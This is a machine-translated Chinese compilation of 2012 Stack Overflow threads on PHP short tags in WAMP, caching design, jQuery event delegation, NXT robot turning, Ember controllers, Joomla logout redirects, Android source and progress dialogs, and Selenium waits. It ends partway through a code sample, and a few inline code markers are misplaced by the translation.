我试过用谷歌搜索，但找不到设置。`<?`我有一个可以接受的生产服务器，`<?php`但我正在尝试在 WAMP 中使用该站点，但它不`<?`单独接受，它坚持使用`<?PHP`. 这是我可以在 WAMP 中设置的吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-26T14:28:25.333

在您的 php.ini 中，将[short-open-tag](http://php.net/manual/en/ini.core.php#ini.short-open-tag)更改为`short_open_tag=On`

> `<? ?>`short_open_tag boolean 告诉 PHP 是否应该允许 PHP 的 open 标记的缩写形式 ( )。如果您想将 PHP 与 XML 结合使用，您可以禁用此选项以使用 `<?xml ?>`内联。否则，您可以使用 PHP 打印它，例如： `<?php echo '<?xml version="1.0"?>'; ?>`. 此外，如果禁用，您必须使用 PHP 开放标记 ( `<?php ?>`) 的长格式。
> 
> 笔记：
> 
> 该指令还影响了`<?=`PHP 5.4.0 之前的简写，与`<? echo`. 使用此快捷方式需要打开 short_open_tag。自 PHP 5.4.0 起，`<?=`始终可用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-26T14:31:23.407

如果您使用的是 WampServer，您也可以左键单击 Windows 任务栏右下角的图标。翻转 PHP，PHP 设置，第 4 项是“短打开标签”，只需单击它，它就会为您打开它，而无需修改任何文件。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-26T14:28:50.407

放

```
short_open_tag = On 
```

或尝试

```
set short_open_tag = 1 
```

在 php.ini 文件中。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-26T14:29:00.663

PHP 选项位于`php.ini`WAMP 安装文件中。
您正在寻找的设置是`short_open_tag = on`

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-09-26T14:37:33.280

我认为这个问题被截断了，无论如何这里是一个试探性的答案：默认情况下，php 现在只`<?php`启用打开标记。要启用它们，您应该为 WAMP 修改默认位于 C:/wamp/bin/php/php5.3.0 中的 php.ini 文件（假设您使用的是 php 5.3.0）。如果您对查找 php.ini 文件有疑问，请[查看这些说明](https://stackoverflow.com/questions/10528212/which-php-ini-file-does-my-wamp-webpage-uses)

在那里，您将找到“short_open_tag”设置，您可以将值设置为“On”。请注意，不建议这样做，为了在多种环境中实现最佳兼容性，Zend 建议仅使用长标签形式`<?php ?>`。请记住在修改 php.ini 文件以加载新设置后重新启动 apache 或任何其他网络服务器。

在[这个 stackoverflow 线程中，可以通过各种 php 版本的引用和默认值获得一个很长且非常完整的答案](https://stackoverflow.com/questions/2476072/tags-not-working-in-php-5-3-1)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-26T14:29:28.557

它在 PHP.ini 文件中

`short_open_tag = Off`或`short_open_tag = On`On 表示您的代码可以以

# design-patterns - 使用单例作为 Memcached/Redis 的原始替代方案

> ID：12603961
> 
> 赞同：1
> 
> 时间：2012-09-26T14:26:54.533
> 
> 标签：design-patterns, singleton, memcached, redis

我正在构建一个网络/移动应用程序，该应用程序将用作与爱好相关的数据门户，从第三方网络服务导入数据，然后允许用户根据偏好自定义和过滤其视图。用户无法编辑从外部检索到的数据——您可以将其视为几乎是经常变化的股票报价，但它不是股票报价。它按类别组织（每个类别都是美国的一个州），每个类别平均有 500 行数据，每个类别中只有几个属性。但是，每个用户的视图可以并且很可能会包含（从）不同的类别（获取数据）。

有一个后端作业每 10 分钟更新一次 MySQL 中的数据。但是，当用户想要检索它时，考虑到磁盘 I/O 的性能以及这些数据的性质、动态和大小，将其存储在某种形式的内存容器中显然是有意义的。应用程序使用而不是从 DB evert 请求中读取它，即缓存它。因此，当此作业运行时，将数据存储在数据库中后，如果前端服务器正在运行，它将更新内存存储。

我熟悉 Memcached 和 Redis 等产品，但由于数据结构相当简单，我想知道使用更轻量级替代方案的利弊，例如 Glassfish 中的 Singleton 对象，它为 web 和移动应用。

谢谢

# javascript - 一页上的多个 Jquery 事件

> ID：12603963
> 
> 赞同：0
> 
> 时间：2012-09-26T14:26:58.917
> 
> 标签：javascript, jquery, post, get, onclick

我对 Jquery 很陌生，需要帮助来尝试在同一页面上运行一些事件。我有两个事件部分，一个是 .get 将数据传递到文件然后显示检索到的数据，这发生在页面加载时。第二部分是关于单击按钮时发送和接收数据的单击事件。

这些事件都可以根据需要工作，但是如果我将两个部分都放在一个页面上，则单击事件将不起作用。下面是我拥有的代码，我希望有人知道如何让它们全部工作？谢谢

```
<script type="text/javascript"> 
    $.get("/layout/standard/check.php", { url: "domain"}, function(data){
        $("#content-area").html(data)
    });

    $(".discuss").click( function() {
        $.post('/layout/standard/report-action.php', {form: "discuss"},function(data){
        $(".message").html(data);
        $(".message").show("slow");
    });
    });
    $(".request").click( function() {
        $.post('/layout/standard/report-action.php', {form: "request"},function(data){
        $(".message").html(data);
        $(".message").show("slow");
    });
    });
    $(".report").click( function() {
        $.post('/layout/standard/report-action.php', {form: "report"},function(data){
        $(".message").html(data);
        $(".message").show("slow");
    });
    });
</script> 
```

* * *

我相信我已经找到了它不起作用的原因，onclick 链接是由 get 事件放在页面上的。如果按钮已经在页面上，但如果以这种方式插入，则按钮似乎可以工作。

这对我来说没有意义，因为按钮仍然充当没有问题的链接......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:45:48.333

尝试委托.. 并将您的代码放入 document.ready 函数中

```
$(function() {
    $.get("/layout/standard/check.php", {
        url: "domain"
    }, function(data) {
        $("#content-area").html(data)
    });

    $("body").on('click','.discuss,.request,.report',function() {
        $.post('/layout/standard/report-action.php', {
            form: $(this).attr('class') //this is assuming you only have 1 class per element
        }, function(data) {
            $(".message").html(data);
            $(".message").show("slow");
        });
    });
});​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:31:41.113

如果事件附加到动态创建的内容，您可能需要委托这些事件。尝试更换：

```
$(".discuss").click( function() { 
```

和：

```
$('body').on('click', '.discuss', function() { 
```

并继续您的所有活动。您可以将`'body'`选择器替换为另一个选择器，只要它始终存在于您的文档中。

# python - 向球的方向旋转机器人

> ID：12603964
> 
> 赞同：0
> 
> 时间：2012-09-26T14:27:01.847
> 
> 标签：python, rotation, angle, lego, nxt

我想知道这种方法是解决这个问题的正确方法吗？我想将面向北的机器人旋转到物体在这种情况下为红球的方向。

下面显示了网格和球的位置 ![在此处输入图像描述](../Images/d93d7d64abdb907246a9b2b9271a3f59.png)

这是我的代码：

```
def turn_to(brick, new_x, new_y, old_x, old_y, angle):
    delta_x = new_x - old_x
    print delta_x
    delta_y = new_y - old_y
    print delta_y

    roboCturn = base * pi
    Circumference = diameter * pi

    if(angle > 315 or angle < 45):
        #tested
        if (delta_x < 0 and delta_y == 0):
            #180 degrees tested
            angle_rad = math.radians(180)
            angle_deg = (angle_rad) * (180/pi)
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho      

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x == 0 and delta_y > 0):
            #90 degrees right tested
            angle_rad = math.radians(90)
            angle_deg = (angle_rad) * (180/pi)
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x == 0 and delta_y < 0): 
            #90 degrees left tested
            angle_rad = math.radians(90)
            angle_deg = (angle_rad) * (180/pi)
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            right.weak_turn(power=power, tacho_units=tachoUnits)
            left.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x > 0 and delta_y > 0):
            # degrees in 1st quadrant tested
            angle_rad = math.atan2(delta_y, delta_x)
            angle_deg = 90 - ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x > 0 and delta_y < 0):
            #degrees in 4th quadrant tested
            angle_rad = math.atan2((math.fabs(delta_y)), delta_x)
            angle_deg = 90 - ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            right.weak_turn(power=power, tacho_units=tachoUnits)
            left.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x < 0 and delta_y > 0):
            #degrees in 2nd quadrant tested
            angle_rad = math.atan2(delta_y, (math.fabs(delta_x)))
            angle_deg = 90 + ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x < 0 and delta_y < 0):
            #degrees in 3rd quadrant tested
            angle_rad = math.atan2((math.fabs(delta_y)), (math.fabs(delta_x)))
            angle_deg = 90 + ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            right.weak_turn(power=power, tacho_units=tachoUnits)
            left.weak_turn(power=-power, tacho_units=tachoUnits)

        else:
            left.weak_turn(power=0, tacho_units=0)
            right.weak_turn(power = 0, tacho_units=0)

    elif(angle > 45 and angle < 135):
        #tested
        if (delta_x == 0 and delta_y < 0):
            #180 degrees tested
            angle_rad = math.radians(180)
            angle_deg = (angle_rad) * (180/pi)
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho      

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x < 0 and delta_y == 0):
            #90 degrees right tested
            angle_rad = math.radians(90)
            angle_deg = (angle_rad) * (180/pi)
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x > 0 and delta_y == 0): 
            #90 degrees left tested
            angle_rad = math.radians(90)
            angle_deg = (angle_rad) * (180/pi)
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            right.weak_turn(power=power, tacho_units=tachoUnits)
            left.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x > 0 and delta_y > 0):
            # degrees in 1st quadrant tested
            angle_rad = math.atan2(delta_y, delta_x)
            angle_deg = 90 - ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            right.weak_turn(power=power, tacho_units=tachoUnits)
            left.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x > 0 and delta_y < 0):
            #degrees in 4th quadrant tested
            angle_rad = math.atan2((math.fabs(delta_y)), delta_x)
            angle_deg = 90 + ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            right.weak_turn(power=power, tacho_units=tachoUnits)
            left.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x < 0 and delta_y > 0):
            #degrees in 2nd quadrant tested
            angle_rad = math.atan2(delta_y, (math.fabs(delta_x)))
            angle_deg = 90 - ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x < 0 and delta_y < 0):
            #degrees in 3rd quadrant tested
            angle_rad = math.atan2((math.fabs(delta_y)), (math.fabs(delta_x)))
            angle_deg = 90 + ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        else:
            left.weak_turn(power=0, tacho_units=0)
            right.weak_turn(power = 0, tacho_units=0)

    elif(angle > 135 and angle < 225):
        #tested
        if (delta_x > 0 and delta_y == 0):
            #180 degrees tested
            angle_rad = math.radians(180)
            angle_deg = (angle_rad) * (180/pi)
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho      

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x == 0 and delta_y < 0):
            #90 degrees right tested
            angle_rad = math.radians(90)
            angle_deg = (angle_rad) * (180/pi)
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x == 0 and delta_y > 0): 
            #90 degrees left tested
            angle_rad = math.radians(90)
            angle_deg = (angle_rad) * (180/pi)
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            right.weak_turn(power=power, tacho_units=tachoUnits)
            left.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x > 0 and delta_y > 0):
            # degrees in 1st quadrant tested
            angle_rad = math.atan2(delta_y, delta_x)
            angle_deg = 90 + ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            right.weak_turn(power=power, tacho_units=tachoUnits)
            left.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x > 0 and delta_y < 0):
            #degrees in 4th quadrant tested
            angle_rad = math.atan2((math.fabs(delta_y)), delta_x)
            angle_deg = 90 + ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x < 0 and delta_y > 0):
            #degrees in 2nd quadrant tested
            angle_rad = math.atan2(delta_y, (math.fabs(delta_x)))
            angle_deg = 90 - ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            right.weak_turn(power=power, tacho_units=tachoUnits)
            left.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x < 0 and delta_y < 0):
            #degrees in 3rd quadrant tested
            angle_rad = math.atan2((math.fabs(delta_y)), (math.fabs(delta_x)))
            angle_deg = 90 - ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        else:
            left.weak_turn(power=0, tacho_units=0)
            right.weak_turn(power = 0, tacho_units=0)

    elif(angle > 225 and angle < 315):
        #tested
        if (delta_x == 0 and delta_y > 0):
            #180 degrees tested
            angle_rad = math.radians(180)
            angle_deg = (angle_rad) * (180/pi)
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho      

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x > 0 and delta_y == 0):
            #90 degrees right tested
            angle_rad = math.radians(90)
            angle_deg = (angle_rad) * (180/pi)
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x < 0 and delta_y == 0): 
            #90 degrees left tested
            angle_rad = math.radians(90)
            angle_deg = (angle_rad) * (180/pi)
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            right.weak_turn(power=power, tacho_units=tachoUnits)
            left.weak_turn(power=-power, tacho_units=tachoUnits)

        elif (delta_x > 0 and delta_y > 0):
            # degrees in 1st quadrant tested
            angle_rad = math.atan2(delta_y, delta_x)
            angle_deg = 90 + ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif(delta_x > 0 and delta_y < 0):
            #degrees in 4th quadrant tested
            angle_rad = math.atan2((math.fabs(delta_y)), delta_x)
            angle_deg = 90 - ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            left.weak_turn(power=power, tacho_units=tachoUnits)
            right.weak_turn(power=-power, tacho_units=tachoUnits)

        elif(delta_x < 0 and delta_y > 0):
            #degrees in 2nd quadrant tested
            angle_rad = math.atan2(delta_y, (math.fabs(delta_x)))
            angle_deg = 90 + ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            right.weak_turn(power=power, tacho_units=tachoUnits)
            left.weak_turn(power=-power, tacho_units=tachoUnits)

        elif(delta_x < 0 and delta_y < 0):
            #degrees in 3rd quadrant tested
            angle_rad = math.atan2((math.fabs(delta_y)), (math.fabs(delta_x)))
            angle_deg = 90 - ((angle_rad) * (180/pi))
            print angle_deg
            distanceTurned = (angle_deg/360) * (roboCturn)
            numberRotations = (distanceTurned) / (Circumference)
            tachoUnits = (numberRotations) * tacho

            right.weak_turn(power=power, tacho_units=tachoUnits)
            left.weak_turn(power=-power, tacho_units=tachoUnits)

        else:
            left.weak_turn(power=0, tacho_units=0)
            right.weak_turn(power = 0, tacho_units=0) 
```

我只想知道这是解决这个问题的正确方法吗？还是有其他选择，因为我会根据我之前发布的问题传递值。谢谢

问候爱德华

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:43:06.383

太多的数学。用于[`math.atan2()`](http://docs.python.org/library/math.html#math.atan2)获得所需的角度并将其从 π/2 中减去以获得适当的旋转。

# ember.js - 为什么 emberjs 在应用程序初始化时创建所有控制器？

> ID：12603966
> 
> 赞同：0
> 
> 时间：2012-09-26T14:27:06.247
> 
> 标签：ember.js

在应用程序初始化时，所有控制器都由 Ember 初始化。在使用任何控制器后，它会保留其值，这在重用控制器时会成为问题。我想知道：

1.  在应用程序初始化时初始化所有控制器的好处？
2.  有什么办法可以解决我重用控制器的问题，以便重置所有变量？

PS：请不要误解“重用控制器”。我想要的只是使用相同的控制器，而不需要以前任何任务中输入的值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T03:00:38.820

控制器旨在长期存在并保持应用程序状态，即使它们的视图可能会闪烁或消失。在典型的 Ember 应用程序中，控制器只创建一次并在应用程序的整个生命周期中存在，因此在应用程序初始化时将它们全部初始化的原因。

对于“重置”控制器的简单方法，您可以使用`Ember.ObjectController`，代理获取和未在控制器上定义的属性集，您设置为`content`属性的对象。要重置控制器，只需设置`content`一个新对象。

# joomla - 用户注销时页面重定向到主页

> ID：12603968
> 
> 赞同：0
> 
> 时间：2012-09-26T14:27:07.557
> 
> 标签：joomla, joomla2.5

我是 Joomla 的新手，我遇到了这个奇怪的问题，我找不到任何帮助，我什至不知道如何去调试它。

基本上，每当用户在页面上**注销时**，该页面就会从那里重定向到主页。如果我清除我的 cookie，一切都会恢复正常，并且可以再次访问该页面。

这不会发生在 Chrome 中，只有 Firefox 和 IE。我正在使用 Joomla 2.5。

我查看了调试控制台，但没有发现任何突出的线索。

感谢大家。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-23T04:16:03.170

我在 Firefox 上使用 joomla 2.5 时遇到了同样的问题，但在 Chrome 上却没有。当我清除缓存时问题会重置，直到我再次注销。然后，当我注销时，主页内容将写入我的缓存中，仅用于注册用户。

当我将登录模块设置为显式将用户带到主页时，我修复了它，而不是将设置保留为默认值。然后它在两种浏览器上都能正常工作，并且主页内容不再被缓存为仅限注册用户的页面。

在扩展中设置注销行为：模块管理器：模块登录：基本选项

希望它也能解决您的问题！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-10T00:29:16.957

我意识到这个问题已经有一年多了，但我刚刚解决了同样的问题。希望我的回答仍然对某人有用。解决方案是禁用一个名为“系统 - 注销”的插件并清除浏览器的缓存后记。这解决了注销后无法返回页面的问题，以及登录模块中设置的“注销重定向页面”参数被忽略的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T14:29:56.490

进入模块管理器，打开登录模块，在参数部分，有2个字段可以选择登录和退出后的重定向。

# android-source - JellyBean android 源代码树的哪里是通知下拉？

> ID：12603969
> 
> 赞同：0
> 
> 时间：2012-09-26T14:27:12.270
> 
> 标签：android-source

我正在寻找实现我在通知下拉列表中看到的特定功能，我想查看它的源代码。任何人，最好是对源代码进行黑客攻击的人，都可以告诉我在哪里查看这些项目：[https](https://github.com/android) ://github.com/android John

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T17:58:53.373

NotificationManagerService 负责显示通知。它位于`frameworks/base/services/java/com/android/server/NotificationManagerService.java`. 在您的情况下，我认为您应该查看[此链接](https://github.com/android/platform_frameworks_base/blob/master/services/java/com/android/server/NotificationManagerService.java)。

# selenium - Selenium WebDriver：确定元素是否可见的随机错误

> ID：12603972
> 
> 赞同：5
> 
> 时间：2012-09-26T14:27:26.910
> 
> 标签：selenium, webdriver, selenium-webdriver

我正在使用硒 2.2。

我正在尝试单击最初未显示但在测试期间变得可见的元素。起初，有时 webdriver 似乎工作得太快，因此元素无法及时显示，从而导致 ElementNotVisibleExceptions。我添加了 WebDriverWait 来等待这些元素变得可见/可点击。但是现在我在使用时遇到了这个随机错误

```
WebDriverWait.until(ExpectedConditions.visibilityOfElementLocated(By.id("id"))); 
```

同样的

```
WebDriverWait.until(ExpectedConditions.elementToBeClickable(By.id("id"))); 
```

这是堆栈跟踪

`org.openqa.selenium.WebDriverException: Error determining if element is displayed (WARNING: The server did not provide any stacktrace information) Command duration or timeout: 219 milliseconds Build info: version: '2.20.0', revision: '16008', time: '2012-02-27 19:03:59' System info: os.name: 'Windows XP', os.arch: 'x86', os.version: '5.1 build 2600 Service Pack 3', java.version: '1.6.0' Driver info: driver.version: RemoteWebDriver at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:44) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27) at java.lang.reflect.Constructor.newInstance(Constructor.java:516) at org.openqa.selenium.remote.ErrorHandler.createThrowable(ErrorHandler.java:170) at org.openqa.selenium.remote.ErrorHandler.throwIfResponseFailed(ErrorHandler.java:123) at org.openqa.selenium.remote.RemoteWebDriver.execute(RemoteWebDriver.java:438) at org.openqa.selenium.remote.RemoteWebElement.isDisplayed(RemoteWebElement.java:280) at org.openqa.selenium.support.ui.ExpectedConditions.elementIfVisible(ExpectedConditions.java:136) at org.openqa.selenium.support.ui.ExpectedConditions.access$1(ExpectedConditions.java:135) at org.openqa.selenium.support.ui.ExpectedConditions$4.apply(ExpectedConditions.java:106) at org.openqa.selenium.support.ui.ExpectedConditions$4.apply(ExpectedConditions.java:1) at org.openqa.selenium.support.ui.ExpectedConditions$11.apply(ExpectedConditions.java:252) at org.openqa.selenium.support.ui.ExpectedConditions$11.apply(ExpectedConditions.java:1) at org.openqa.selenium.support.ui.FluentWait.until(FluentWait.java:201) at MyTest.myTest(MyTest.java:xx) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:600) at junit.framework.TestCase.runTest(TestCase.java:168) at junit.framework.TestCase.runBare(TestCase.java:134) at junit.framework.TestResult$1.protect(TestResult.java:110) at junit.framework.TestResult.runProtected(TestResult.java:128) at junit.framework.TestResult.run(TestResult.java:113) at junit.framework.TestCase.run(TestCase.java:124) at junit.framework.TestSuite.runTest(TestSuite.java:243) at junit.framework.TestSuite.run(TestSuite.java:238) at junit.framework.TestSuite.runTest(TestSuite.java:243) at junit.framework.TestSuite.run(TestSuite.java:238) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:83) at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:45) at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:460) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:673) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:386) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:196)`

 `这只有时会发生。忽略 WebDriverException 可能会解决此问题，但这似乎不是一个干净的解决方案。这不可能是超时问题，因为我尝试将超时限制设置为一分钟或更长时间，但几毫秒后仍然失败。

有人对此有干净的解决方案吗？

提前致谢

编辑：顺便说一句。我正在使用 InternetExplorerDriver

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T12:17:56.123

确保页面只有一个 modalPanel。尝试获取可见面板（java）：

```
public WebElement getVisibleModalPanel(){
 for (WebElement element : driver.findElements(By.cssSelector('csslocator'))) {
  if (element.isDisplayed()) {
       return element;
  }
 }
 return null;
} 
```

实现等这样的事情：

```
(new WebDriverWait(getDriver(), timeout, 400)).ignoring(StaleElementReferenceException.class).until(
                new ExpectedCondition<Boolean>() {

                    @Override
                    public Boolean apply(WebDriver driver) {
                        for (WebElement element : driver.findElements(By.cssSelector(locator))) {
                            if (element.isDisplayed()) {
                                return true;
                            }
                        }
                        return false;
                    }

                }); 
````

# android - 设置对话框进度

> ID：12603974
> 
> 赞同：9
> 
> 时间：2012-09-26T14:27:30.640
> 
> 标签：android, progressdialog

我有一个异步任务，它在执行任务时不添加百分比。它始终保持在 0% 0/100

这是我的代码

```
 private class getAppInfo extends AsyncTask<String, String, String> {
    /** The system calls this to perform work in a worker thread and
      * delivers it the parameters given to AsyncTask.execute() */
    ProgressDialog dialog;

    @Override
    protected void onPreExecute() {
        if(showLoading == true){
             dialog = new ProgressDialog(SelfHelp.this);
             dialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
             dialog.setMessage("Loading");
             dialog.setIndeterminate(true);
             dialog.setCancelable(false);   
             dialog.setMax(100);
             dialog.setProgress(100);
             dialog.show();
        }
    }

    @Override
    protected String doInBackground(String... urls) {                       
        String xml = null;
        int count = 0;
        try {
            // defaultHttpClient
            DefaultHttpClient httpClient = new DefaultHttpClient();
            HttpGet httpGet = new HttpGet(urls[0]);

            HttpResponse httpResponse = httpClient.execute(httpGet);
            HttpEntity httpEntity = httpResponse.getEntity();
            xml = EntityUtils.toString(httpEntity);

            while(count != 100){
                publishProgress(""+count);
                count += 5;
            }

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }                                

        Document doc = parser.GetDomElement(xml);
        NodeList nl = doc.getElementsByTagName("topic");
        getChildElements(nl);                           
        return xml;
    }

    @Override
    protected void onProgressUpdate(String... progress) {
        Log.v("count",progress[0]);
        dialog.setProgress(Integer.parseInt(progress[0]));
   }

    /** The system calls this to perform work in the UI thread and delivers
      * the result from doInBackground() */
    @Override
    protected void onPostExecute(String result) {    
        //dialog.setProgress(100);
        menuList.setAdapter(setListItems(menuItems));
        menuList.setTextFilterEnabled(true);
        if(showLoading == true){
            dialog.dismiss();
            showLoading = false;
        }
    } 
```

它确实进入`onProgressUpdate`并且计数增加了 5，但进度条没有改变。我怎样才能让它增加 5 并正确显示进度？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-09-26T14:30:31.517

您的问题与：如果您想要更新进度，`setIndeterminate(true)`您应该将其设置为。`false`如果你`setIndeterminate(true)`那么 ProgressDialog 将作为经典的 Windows 沙漏

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-26T14:39:15.187

您可以尝试以下代码，它以百分比显示进度，这是代码，

```
public class ProgressBarExampleActivity extends Activity 
{
    ProgressThread progThread;
